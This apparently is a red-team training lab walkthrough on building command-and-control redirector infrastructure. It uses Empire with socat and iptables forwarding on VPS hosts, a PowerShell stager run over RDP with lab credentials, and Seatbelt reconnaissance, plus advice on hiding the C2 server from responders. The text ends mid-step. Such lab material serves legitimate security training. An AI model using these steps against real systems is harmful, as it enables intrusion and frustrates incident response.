#### Tags: [[12 - Command and Control (TA0011)]]
## Objectives

    Understand the use of redirectors in attack infrastructure
    Create a listener on Empire that will expect redirector routing
    Create stager payloads that will route through the redirector
    Execute the stager payload in the lab environment

## Overview
This lab will focus on the:
- Use of redirectors to create a buffer between the C2 server (Blue Space) and the Target network (Red Space). 
- We will create an account on a Virtual Private Server (VPS) vendor and 
- Provision two VPS's to redirect traffic through.
- Thus, we will leverage Empire C2 stager (Red Space) to perform routing via redirector (Grey Space) to reach the Empire listener (Blue Space).

![[Pasted image 20240310163005.png]]
#### Redirector Communication Pattern
1. C2 Listener will use Redirector IP Address
2. The VPS running Redirector will leverage socat to redirect traffic from Stager (incoming) to Listener (outgoing)
3. C2 Stager will callback to Redirector IP Address
### 1. Launch [[Empire C2#Create an Empire listener|Empire C2 & Setup Communication]]

1. Launch Empire by starting the server 
	1. `sudo ./ps-empire server`
2. Start the StarKiller from the terminal.
	1. `./starkiller-1.9.0.AppImage --no-sandbox`
3. Log into Starkiller UI
	1. `Url: https://localhost:1337 | Username: empireadmin | Password: password123
4. Create certificates for HTTPS, this is optional as Empire normally already has bundled default certificates, but let's do it for good measure.
	1. `cd /opt/Empire/setup/ && ./cert.sh
### 2. Provision VPS
```markdown
# Spawn VPS for redirection:
4-8-15.vpspawn.com with credentials root : 0wnTHEnet!
16-23-42.vpspawn.com with credentials root : ONth3NET?
```
![[Pasted image 20240310165118.png]]

### 3. socat Redirection
1. SSH to your new VPS as root and using one of the passwords provided by vpspawn.com. 
	1. `ssh root@4-8-15.vpspawn.com`
2. Take note of the eth0 adapter's IP, you will need this later.
	1. `ip a`
3. Then create a screen session and run socat using the syntax below:
	1. `screen -S socat443`
	2. `socat TCP4-LISTEN:443,fork TCP4:<C2-IP-Address or Hostname>:443`

Note: The C2 IP addr or hostname can be the value of your tun0 adapter.

Note: The use of screen is a safety mechanism because we can get back to shell that has our socat process if we get disconnected from our redirector.
- To detach from the screen session type` Ctrl+a then d`. 
- To view screen sessions run `screen -ls` 
- To reattach to a detached screen run `screen -r <screen session name>.`

### 4. Create Listener
Create an Empire listener with a Host set to a redirector address
- ###### Listener will have the IP address or hostname of the redirector, and not your tun0 adapter. 
- ###### Stager will have the Redirector IP / Host value will be used for communication, and not want your C2 server's address or hostname here.

Select http in the drop down menu. Then provide the following values:

    Name: interactive-https
    Host: https://10.130.7.5:443 <- This must be the ip address or hostname of the redirector
    Port: 443
    Bind IP: 0.0.0.0
    StagingKey: AddSomethingRandomTo32Characters
    CertPath: /opt/Empire/empire/server/data

Leave the rest as defaults and click the SUBMIT button in the upper right corner of the screen.

![[Pasted image 20240310173626.png]]
### 5. Create Stager

Select multi/launcher in the drop down menu. Then provide the following values:

    StarkillerName: interactive-https-pwsh
    Listener: interactive-https
    Language: powershell

Leave the rest as defaults and click the SUBMIT button in the upper right corner of the screen

![[Pasted image 20240310173648.png]]

### 6. Deliver Stager
- Execute the Stager to create an Agent in the target environment via RDP: 
`xfreerdp +clipboard /cert-ignore /u:Gareth.Kilgallen /p:Hu825meapvsAq#Rx /v:wk01.draconem.corp

![[Pasted image 20240310174517.png]]
###### Note: In a real engagement you would avoid RDP and if you absolutely must, you should use a proxy for the connection.
- We are going to RDP to the target network, consider this a system you control and disregard communication path, OPSEC, and tradecraft on this system only. 

Open a command prompt by clicking the windows icon in the lower left and typing cmd.exe. Then right click in the command prompt. 
- You should see a lot of encoded text. Press Enter to spawn a new agent. The command prompt should close automatically. You may now exit your RDP session.
![[Pasted image 20240310174620.png]]
![[Pasted image 20240310174630.png]]
### 7. Agent Interaction

Click on the chain icon on the left navigation window to bring up the Agents dashboard. 
- You may now create tasks to explore the new system.

If you look at the VIEW tab of the agent you will see that the External IP is the IP of your redirector while the internal IP is the IP of the host.

Let's run Seatbelt from GhostPack which will allow us to get a lot of information about the user and host on this system. 
- Provide the following values on the INTERACT tab of the agent and click submit:

	    Execute Module: csharp/GhostPack/Seatbelt
	    DotNetVersion: Net35
	    Command: -group=user

![[Pasted image 20240310181957.png]]
#### Notes

Now all the C2 traffic is routed through a redirector in gray space. This creates one hop between your C2 server and the target network.
- If Incident Responders conduct network forensics, they would get the DNS or IP address of the temporary VPS instead of your C2 server.
- The Blue Team can ask the VPS provider for logs around the time of the incident through Law Enforcement channels or by filling out an Abuse report.
- With one hop that might be a concern, but redirectors can be chained together to make it more difficult to unravel the whole chain.
- If chaining redirectors, use different providers in different geographic areas.
## Conclusion

In this lab we created an HTTP listener that was configured with X.509 certificates to safeguard our C2 traffic. 
- We then generated a PowerShell stager and delivered it to the windows system in the target environment. 
- For the purposes of the lab, we used direct RDP access to execute our stager code. 
- In a real engagement other delivery methods like phishing would be necessary to get that initial access. 
- Lastly, we were assured that all the communication worked because the Agent was spawned and we could see that the traffic was directed to our C2 through the redirector.

---
##### BONUS - iptables
1. Try to establish redirection with iptables on the redirector (not your Slingshot Linux VM). First enable ipv4 forwarding with `sysctl net.ipv4.ip_forward=1` and then establish a prerouting rule.
2. Create iptables rules
```markdown
root@4-8-15:~# sysctl net.ipv4.ip_forward=1
root@4-8-15:~# iptables -I INPUT -p tcp -m tcp --dport 443 -j ACCEPT
root@4-8-15:~# iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination <C2-IP-Address or Hostname>:443
root@4-8-15:~# iptables -t nat -A POSTROUTING -j MASQUERADE
root@4-8-15:~# iptables -I FORWARD -j ACCEPT
root@4-8-15:~# iptables -P FORWARD ACCEPT
root@4-8-15:~# nano /etc/ssh/sshd_config
root@4-8-15:~# service sshd restart or systemctl restart sshd
```
##### BONUS - SSH | Redirector Configuration
1. By default the SSH daemon will not allow remote port forwards to bind to all adapters (0.0.0.0) unless the configuration is set properly. 
2. Open the SSH daemon config with `vim /etc/ssh/sshd_config`  on the redirector. 
```markdown
# Change the value of `GatewayPorts and AllowTcpForwarding to yes.`
GatewayPorts yes
AllowTcpForwarding yes
```
3. Restart the ssh daemon with `service sshd restart or systemctl restart sshd` for the new configuration to take effect.
4. ssh to the redirector and establish a reverse port forward:
